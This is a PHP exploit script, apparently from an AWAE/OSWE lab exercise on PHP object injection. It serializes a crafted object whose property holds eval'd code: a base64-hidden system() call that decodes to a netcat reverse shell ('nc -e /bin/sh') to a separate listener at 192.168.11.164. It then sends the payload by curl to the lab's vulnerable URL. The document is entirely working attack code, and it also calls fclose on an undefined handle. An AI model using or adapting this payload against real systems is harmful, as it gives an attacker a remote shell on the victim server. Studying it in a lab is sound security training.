<?php
error_reporting(-1);
class Bar {
    public $args="system(base64_decode('bmMgLW52IDE5Mi4xNjguMTEuMTY0IDU1NTUgLWUgL2Jpbi9zaA=='));";

    public function __construct() {
    }


    public function _hack(){
        if (eval($this->args) === NULL){
       	    print "<p>Congrats you redirected execution to controlled PHP code!</p>";
        }
    }
}


class Foo {
    public $className;
    public function __construct() {
    $this->className= new Bar;
    }

}


print serialize(new Foo);
print "\n";
$base64= base64_encode(serialize(new Foo));
print base64_encode(serialize(new Foo));
print "\n";

$exploiturl="http://192.168.11.140/awae/objectinjection/extramile.php?object=" . $base64 . '"';
print "Executing payload on URL --> " . $exploiturl;
$ch = curl_init($exploiturl);

curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
fclose($fp);

?>
